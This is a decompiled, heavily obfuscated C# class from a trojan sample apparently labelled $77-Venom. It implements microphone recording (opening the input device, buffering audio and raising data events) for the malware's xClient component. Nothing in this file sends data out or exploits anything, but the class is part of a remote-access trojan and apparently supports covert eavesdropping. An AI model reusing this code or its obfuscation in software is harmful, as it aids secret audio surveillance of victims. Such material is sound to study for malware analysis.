// Decompiled with JetBrains decompiler
// Type: xClient.Core.NAudio.Wave.WaveInEvent
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;
using System.Threading;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.NAudio.Wave.WaveStreams;

namespace xClient.Core.NAudio.Wave
{
  public class WaveInEvent : IWaveIn, IDisposable
  {
    private readonly AutoResetEvent callbackEvent;
    private readonly SynchronizationContext syncContext;
    private IntPtr waveInHandle;
    private volatile bool recording;
    private WaveInBuffer[] buffers;

    public event EventHandler<䌫߬䋼㬈찎倐\uFFFD硇罹뽕㨇\u2BAC偩\uE74E젠ো䕙\u27B1\u33F9ⴄ> DataAvailable;

    public event EventHandler<눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑> RecordingStopped;

    public WaveInEvent()
    {
      this.callbackEvent = new AutoResetEvent(false);
      this.syncContext = SynchronizationContext.Current;
      this.DeviceNumber = 0;
      this.WaveFormat = new \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹(8000, 16, 1);
      this.BufferMilliseconds = 100;
      this.NumberOfBuffers = 3;
    }

    public static int DeviceCount => \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.\u28D6䖠ᖷơ\u09B4㙘헇\uFFFD繵\uE95F䅣軲䇍\u240C쒸ﵩវﬅ쭍锕();

    public static ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨 GetCapabilities(
      int devNumber)
    {
      ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨 waveInCaps = new ᄛꧡ㮘侺镎ᡧ\uFFC9䶵砆\uEB7E\u25D8辳왻\u2650㑎\uE940왆\u3350뢪蓨();
      int waveInCapsSize = Marshal.SizeOf((object) waveInCaps);
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.䓠軣㔡ꀵ㬏ﳷ閗瘗涉\uFFFDﲔ觛춇\uFFFD뾚ຄ徕珊\u1A9Fഒ((IntPtr) devNumber, out waveInCaps, waveInCapsSize), "waveInGetDevCaps");
      return waveInCaps;
    }

    public int BufferMilliseconds { get; set; }

    public int NumberOfBuffers { get; set; }

    public int DeviceNumber { get; set; }

    private void CreateBuffers()
    {
      int bufferSize = this.BufferMilliseconds * this.WaveFormat.AverageBytesPerSecond / 1000;
      if (bufferSize % this.WaveFormat.BlockAlign != 0)
        bufferSize -= bufferSize % this.WaveFormat.BlockAlign;
      this.buffers = new WaveInBuffer[this.NumberOfBuffers];
      for (int index = 0; index < this.buffers.Length; ++index)
        this.buffers[index] = new WaveInBuffer(this.waveInHandle, bufferSize);
    }

    private void OpenWaveInDevice()
    {
      this.CloseWaveInDevice();
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.珱劼熓鳓\uE9DF\uFFFD붇赬\uF1E5\u25AE\uEDA7퉏梮\uEC2E\u4DF5Ԓጙ뽟㝽㣵(out this.waveInHandle, (IntPtr) this.DeviceNumber, this.WaveFormat, this.callbackEvent.SafeWaitHandle.DangerousGetHandle(), IntPtr.Zero, \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.\uF8CE\u33B0햜풬닡䣏꽺ꕷ챳浛\uEC8F뼫畬欎Ңܷ醞倗䃵섭.ᅘ中엲쎯쏂勼\u09D1ϖ\uFFFD覶댢皇\uFFFD\u2FB9ບ牳궲깟అ颚), "waveInOpen");
      this.CreateBuffers();
    }

    public void StartRecording()
    {
      if (this.recording)
        throw new InvalidOperationException("Already recording");
      this.OpenWaveInDevice();
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.\uE0E2\uFFFD\uE988㝣怫밤憲霨ᩗ娘䤒Ꮓؙ粓\u27B2헣里㸎መ\uF25B(this.waveInHandle), "waveInStart");
      this.recording = true;
      ThreadPool.QueueUserWorkItem((WaitCallback) (state => this.RecordThread()), (object) null);
    }

    private void RecordThread()
    {
      Exception e = (Exception) null;
      try
      {
        this.DoRecording();
      }
      catch (Exception ex)
      {
        e = ex;
      }
      finally
      {
        this.recording = false;
        this.RaiseRecordingStoppedEvent(e);
      }
    }

    private void DoRecording()
    {
      foreach (WaveInBuffer buffer in this.buffers)
      {
        if (!buffer.InQueue)
          buffer.Reuse();
      }
      while (this.recording)
      {
        if (this.callbackEvent.WaitOne() && this.recording)
        {
          foreach (WaveInBuffer buffer in this.buffers)
          {
            if (buffer.Done)
            {
              if (this.DataAvailable != null)
                this.DataAvailable((object) this, new 䌫߬䋼㬈찎倐\uFFFD硇罹뽕㨇\u2BAC偩\uE74E젠ো䕙\u27B1\u33F9ⴄ(buffer.Data, buffer.BytesRecorded));
              buffer.Reuse();
            }
          }
        }
      }
    }

    private void RaiseRecordingStoppedEvent(Exception e)
    {
      EventHandler<눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑> handler = this.RecordingStopped;
      if (handler == null)
        return;
      if (this.syncContext == null)
        handler((object) this, new 눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑(e));
      else
        this.syncContext.Post((SendOrPostCallback) (state => handler((object) this, new 눡쩷띉ን臉萑ㄢ崌ⰶ\u2349㣥盠樭윩䥟姩ᰥ拿㩆㹑(e))), (object) null);
    }

    public void StopRecording()
    {
      this.recording = false;
      this.callbackEvent.Set();
      㵼眢謟ᱥ︦\u2B28؄秀ᶙᨱ벁蕿\uF60C校쌎흭ä䌾嶆\uE399.定뙟乗廓囿ꮆ\uEE08\u2A64윪웧晪鯫\u2AE1堢蝹\u258C\u0D56뱴ꗂ뺽(\uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.噫짣쉍됓괽땫꼽똃煷鰙\uE555ﶽҸﶌ\uECEC\uFFFD\uEF18\uF2B6쫶ᚁ(this.waveInHandle), "waveInStop");
    }

    public \uF610\uF0D5\uE068䑡쎣أ蕩\u292F\uEC8E\u2EC8\uF4AA\uE1BD퍳ܖ苸\uA630岐꿦ۍ遹 WaveFormat { get; set; }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      if (this.recording)
        this.StopRecording();
      this.CloseWaveInDevice();
    }

    private void CloseWaveInDevice()
    {
      int num1 = (int) \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.曘㭼䑬\u2FC3쐦\uF526\uA4CB鉰ৢ銀誔ﭟ峠䖥曵렲笮လ覬\u2ACF(this.waveInHandle);
      if (this.buffers != null)
      {
        for (int index = 0; index < this.buffers.Length; ++index)
          this.buffers[index].Dispose();
        this.buffers = (WaveInBuffer[]) null;
      }
      int num2 = (int) \uF22A폆幏\u2D77\uE703ꂀ䀣켨钕䠢㥧\u2D2Aი鄠쩘뢚놇燀쁱䧢.㡚긓\uFFFD\u205B\u2BDDᩂﷷ먡끋ᢈ黽曐ᷯ敔籤᷎缑㒍焠\u9FF1(this.waveInHandle);
      this.waveInHandle = IntPtr.Zero;
    }

    public \uEDF4맅沶뀗㪠硋ᾧ\uF8BA산ᧈ珌\uF22DГ\u20A6꽔\uF170\u2790률껚끍 GetMixerLine() => !(this.waveInHandle != IntPtr.Zero) ? new \uEDF4맅沶뀗㪠硋ᾧ\uF8BA산ᧈ珌\uF22DГ\u20A6꽔\uF170\u2790률껚끍((IntPtr) this.DeviceNumber, 0, 撩鈕\uF10FӔ黒\u1AE2ծ塐᧘\uF859齍ᬂ쵹д揼笕\uE703룤\uE976豶.\u25B4脶ኛⳏ笗\uF723ﲒ\u0FDA媟푞坬\uEA56\uFFFD纈샾循\u27C5駝鞲휊) : new \uEDF4맅沶뀗㪠硋ᾧ\uF8BA산ᧈ珌\uF22DГ\u20A6꽔\uF170\u2790률껚끍(this.waveInHandle, 0, 撩鈕\uF10FӔ黒\u1AE2ծ塐᧘\uF859齍ᬂ쵹д揼笕\uE703룤\uE976豶.ꤿ㚦閈\uEDD9儾骖巆ꢦ\u9FFE\uF29A讧\uFBB9鈥\u2EE3殄탯֮쳛襇\uF7DA);

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }
  }
}
